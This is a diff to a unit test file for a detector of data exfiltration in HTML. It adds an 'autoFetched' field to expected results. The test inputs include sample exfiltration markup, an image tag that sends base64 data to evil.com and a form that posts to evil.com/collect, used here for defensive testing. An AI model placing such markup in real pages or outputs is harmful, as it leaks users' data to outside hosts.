@@ -1464,6 +1464,7 @@ describe("unit: detectExfil HTML-attr + node types", () => {
   it("flags an exfil <img src> as an image without modifying anything", () =>
     assert.deepEqual(onlyThreat(`<img src="https://evil.com/x?data=${b64}">`), {
       isImage: true,
+      autoFetched: true,
       reason: "suspicious query parameter",
       target: "evil.com",
     }));
@@ -1542,7 +1543,15 @@ describe("unit: detectExfil HTML-attr + node types", () => {
     ));
   it("flags an off-origin form action", () =>
     assert.deepEqual(detectExfil(`<form action="https://evil.com/collect">`), [
-      { isImage: false, reason: "off-origin form action", target: "evil.com" },
+      {
+        isImage: false,
+        // A form target navigates on its own — auto-fetched despite not being
+        // an image, which is why the severity tier reads this field and not
+        // `isImage`.
+        autoFetched: true,
+        reason: "off-origin form action",
+        target: "evil.com",
+      },
     ]));
   it("flags an off-origin formaction on a button", () =>
     assert.equal(
